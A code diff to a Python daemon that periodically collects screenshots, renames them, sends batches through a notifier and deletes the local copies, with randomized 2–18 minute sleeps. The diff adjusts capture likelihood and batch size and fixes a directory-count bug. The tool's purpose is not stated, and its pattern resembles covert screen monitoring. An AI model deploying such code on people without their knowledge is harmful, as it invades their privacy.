@@ -5,7 +5,7 @@ import random
 import base64
 import sys
 import os
-from os.path import join, basename, dirname
+from os.path import join, basename
 import uuid
 import traceback
 from watchdog.observers import Observer
@@ -36,8 +36,8 @@ class Daemon():
             installation_path,
             recursive=True)
         self.notifier.send(subject="Starting up")
-        self.likelihood = .5  # 50% chance
-        self.max_images = 15  # don't keep too many images
+        self.likelihood = .25  # 25% chance
+        self.max_images = 25  # don't keep too many images
         self.images_dir = join(self.screenshots_directory, 'captured_images')
 
     def should_execute(self):
@@ -54,16 +54,15 @@ class Daemon():
             os.makedirs(self.images_dir)
         for filename in filenames:
             new_filename = "{}-{}".format(uuid.uuid4(), basename(filename))
-            full_name = join(dirname(filename), new_filename)
             os.rename(filename, join(self.images_dir, new_filename))
-        return len(os.listdir()) > self.max_images
+        return len(os.listdir(self.images_dir)) > self.max_images
 
     def send(self):
         filenames = [join(self.images_dir, n) for n in os.listdir(self.images_dir)]
         self.notifier.send_screenshots(filenames)
         for filename in filenames:
             os.remove(filename)
-            
+
     def sleep(self):
         self.sleep_seconds = random.randint(120, 1080)  # 2-18 min
         time.sleep(self.sleep_seconds)
